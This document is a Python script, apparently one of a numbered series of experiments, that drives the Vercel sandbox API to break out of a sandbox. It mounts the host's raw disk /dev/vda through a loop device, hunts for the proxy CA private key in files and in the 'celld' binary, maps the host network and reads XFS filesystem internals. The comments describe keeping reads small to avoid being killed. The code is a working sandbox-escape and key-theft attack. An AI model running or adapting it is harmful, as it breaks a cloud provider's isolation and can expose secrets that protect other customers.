# 实验J148: CA私钥真实文件名挖掘 + 沙箱网络布局 + celld代理端口 + xfs超级块
# j147: celld字符串含 vercel-proxy-ca.pem/.crt + PRIVATE KEY; 宿主IP 100.64.79.9 网关100.64.0.1
#       /dev/vda 任何读取都触发杀进程 -> 只能小读(<=4KB已验证安全)
# 方法: cmdA 沙箱网络+find; cmdB 挂载态定向找ca文件+celld字符串上下文; cmdC xfs超级块小读
# 零破坏: 纯读
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def catfile(sid, path, label, n=15000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "cat", "args": [path], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)

NAME = "expj148"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

# cmdA: 沙箱网络 + find pem/key
CA = r'''
import os, subprocess
out = open("/tmp/d148a.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=15):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)
p("=== IP_ADDR ===")
p(sh("ip addr 2>&1"))
p("=== IP_ROUTE ===")
p(sh("ip route 2>&1"))
p("=== RESOLV ===")
p(sh("cat /etc/resolv.conf 2>&1"))
p("=== FIND_PEM_KEY ===")
p(sh("find / -xdev \\( -name '*ca-key*' -o -name '*proxy*' -o -name '*.crt' -o -name '*.key' \\) 2>/dev/null | head -40", 30))
p("=== FIND_PEM ===")
p(sh("find / -xdev -name '*.pem' 2>/dev/null | head -30", 30))
p("=== HOSTS ===")
p(sh("cat /etc/hosts 2>&1"))
p("=== DONE")
out.close()
'''

# cmdB: 挂载态定向找 vercel-proxy-ca + celld 字符串上下文
CB = r'''
import os, subprocess, ctypes, fcntl
libc = ctypes.CDLL(None, use_errno=True)
libc.mount.restype = ctypes.c_int
vda = os.open("/dev/vda", os.O_RDWR)
loop = os.open("/dev/loop0", os.O_RDWR)
fcntl.ioctl(loop, 0x4C00, vda)
os.makedirs("/tmp/host", exist_ok=True)
ctypes.set_errno(0)
r = libc.mount(b"/dev/loop0", b"/tmp/host", b"xfs", 1, b"nouuid,norecovery")
print("MOUNT_RC", r)
''' + r'''
import subprocess
out = open("/tmp/d148b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=15):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)
def ctx(kw, n=400):
    try:
        f = open("/tmp/host/opt/vercel/celld", "rb")
        hits = []
        data = f.read()
        idx = 0
        while True:
            i = data.find(kw, idx)
            if i < 0:
                break
            hits.append(data[max(0, i - n):i + 2 * n])
            idx = i + 1
            if len(hits) >= 6:
                break
        f.close()
        return hits
    except Exception as e:
        return ["ERR %r" % (e,)]
p("=== PROXY_CA_CTX ===")
for h in ctx(b"vercel-proxy-ca", 300):
    p("C:", repr(h[:700]))
p("=== PRIVATE_KEY_CTX ===")
for h in ctx(b"PRIVATE KEY", 250):
    p("K:", repr(h[:600]))
p("=== CELLD_DYN_LINKS ===")
p(sh("ls -la /tmp/host/opt/vercel/ 2>&1"))
p("=== ETC_VERCEL ===")
p(sh("ls -la /tmp/host/etc/vercel/ 2>&1; cat /tmp/host/etc/vercel/version 2>&1 | head -5"))
p("=== FIND_PROXY_CA ===")
p(sh("find /tmp/host -name '*vercel-proxy*' -o -name '*ca-key*' 2>/dev/null | head -20", 30))
p("=== RUN_CELL_RETRY ===")
for i in range(3):
    p("try", i)
    p(sh("ls -la /tmp/host/run/cell/ 2>&1; cat /tmp/host/run/cell/ca-cert.pem 2>&1 | head -c 300", 10))
    p(sh("dd if=/tmp/host/run/cell/ca-cert.pem bs=512 count=8 2>&1 | head -c 400", 10))
p("=== DONE")
out.close()
'''

# cmdC: xfs 超级块小读 (4KB安全) + log位置计算
CC = r'''
import os, struct
out = open("/tmp/d148c.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
f = open("/dev/vda", "rb")
hdr = f.read(4096)
f.close()
p("magic", hdr[:4])
# xfs superblock 字段 (V5):
# 0  magic 4
# 4  blocksize 4
# 8  dblocks 8
# 16 rblocks 8
# 24 rextents 8
# 32 uuid 16
# 48 logstart 8
# 56 rootino 8
# 64 rbmino 8
# ...
if hdr[:4] == b"XFSB":
    bs = struct.unpack_from(">I", hdr, 4)[0]
    dblocks = struct.unpack_from(">Q", hdr, 8)[0]
    logstart = struct.unpack_from(">Q", hdr, 48)[0]
    rootino = struct.unpack_from(">Q", hdr, 56)[0]
    uuid = struct.unpack_from(">16s", hdr, 32)[0]
    agblocks = struct.unpack_from(">I", hdr, 84)[0]
    agcount = struct.unpack_from(">I", hdr, 88)[0]
    logblocks = struct.unpack_from(">I", hdr, 104)[0]
    logstart2 = struct.unpack_from(">Q", hdr, 112)[0]  # v5: sb_logstart in 112? 实际 layout:
    p("blocksize", bs)
    p("dblocks", dblocks, "=GB", dblocks * bs / 1e9)
    p("logstart", logstart, "=MB", logstart * bs / 1e6)
    p("logblocks", logblocks)
    p("rootino", rootino)
    p("agblocks", agblocks)
    p("agcount", agcount)
    p("uuid", uuid.hex())
    # v5 sb fields: 96 sb_features_compat 4, 100 ro_compat 4, 104 inprogress 4, 108 imax_pct 4,
    # 112 icount 8, 120 ifree 8, 128 fdblocks 8, 136 frextents 8,
    # 144 uquotino 8, 152 gquotino 8, 160 qflags 2, 162 flags 2, 164 shared_vn 4, 168 inoalignmt 4,
    # 172 unit 4, 176 width 4, 180 dirblklog 1, 181 logags 1, 182 sectsize 2, 184 sectsize log 1,
    # 185 dirsblog 1, 186 logsunit 4, 190 blocklog 1, 191 sb_features2 4 ...
    # v5: 288 features_ro_compat 4, 292 features_incompat 4, 296 features_log_incompat 4,
    # 300 crc 4, 304 spino_align 4, 308 pquotino 8, 316 lsn 8, ...
    # 简化: logstart 在 48 (v4/v5 相同 offset 48)
    # 计算 log 区 (通常 AG0 或 AG1)
    p("log MB range", logstart * bs / 1e6, "-", (logstart + logblocks) * bs / 1e6)
p("=== LOG_HEAD ===")
# 读 log 区头部 (小读安全)
try:
    f = open("/dev/vda", "rb")
    f.seek(logstart * bs if 'logstart' in dir() else 0)
    lh = f.read(4096)
    f.close()
    p("log head", lh[:32].hex())
except Exception as e:
    p("LOG_ERR", repr(e))
p("=== DONE")
out.close()
'''

run_cmd(sid, CA, "net-find", timeout=120)
catfile(sid, "/tmp/d148a.txt", "d148a", 8000)

run_cmd(sid, CB, "proxyca", timeout=200)
catfile(sid, "/tmp/d148b.txt", "d148b", 14000)

run_cmd(sid, CC, "xfs-sb", timeout=100)
catfile(sid, "/tmp/d148c.txt", "d148c", 3000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
